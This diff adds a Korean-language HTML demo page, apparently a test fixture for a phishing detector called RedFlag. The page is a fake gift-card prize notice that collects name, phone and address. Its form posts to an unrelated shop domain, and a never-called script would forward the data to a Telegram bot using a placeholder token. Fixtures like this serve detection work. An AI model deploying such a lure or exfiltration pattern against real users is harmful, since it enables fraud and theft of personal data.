@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>상품권 이벤트 당첨 안내</title>
+<!-- RedFlag DEMO page (data destination): local-only. The form posts to an unrelated domain and the submit script
+     would forward the input to a Telegram bot. The script is NEVER run (onsubmit returns false, the function is
+     never called): the extractor only reads the URL literal, so nothing is ever sent anywhere. -->
+<style>body{margin:0;font-family:"Apple SD Gothic Neo","Noto Sans KR",Roboto,sans-serif;background:#f6f7f9;color:#222}header{background:#fff;padding:16px 20px;border-bottom:3px solid #2b6cb0;font-weight:800;font-size:20px;color:#2b6cb0}main{max-width:440px;margin:0 auto;padding:18px}.box{background:#fff;border-radius:10px;padding:16px;margin-bottom:14px;line-height:1.5;font-size:15px}label{display:block;font-size:13px;margin:10px 0 4px;color:#555}input{width:100%;box-sizing:border-box;padding:11px;border:1px solid #ccd;border-radius:6px;font-size:15px}button,.btn{display:block;text-align:center;text-decoration:none;margin-top:16px;width:100%;box-sizing:border-box;padding:14px;border:0;border-radius:6px;background:#2b6cb0;color:#fff;font-size:16px;font-weight:700}small{color:#777}</style>
+</head>
+<body>
+<header>고객 감사 이벤트</header>
+<main>
+  <div class="box"><b>축하합니다! 10만원 상품권에 당첨되셨습니다.</b><br>상품권 배송을 위해 아래 정보를 입력해 주세요.</div>
+  <form class="box" action="https://www.optika-shop-ua.com/save.php" method="post" onsubmit="return false">
+    <label for="n">이름</label><input id="n" name="name">
+    <label for="p">휴대폰 번호</label><input id="p" name="phone" type="tel">
+    <label for="a">주소</label><input id="a" name="address">
+    <button type="submit">상품권 받기</button>
+  </form>
+</main>
+<script>
+  // demo only: never called
+  function forwardWinner(data) {
+    return fetch("https://api.telegram.org/bot" + "000000:DEMO-TOKEN" + "/sendMessage", { method: "POST", body: JSON.stringify(data) });
+  }
+</script>
+</body>
+</html>
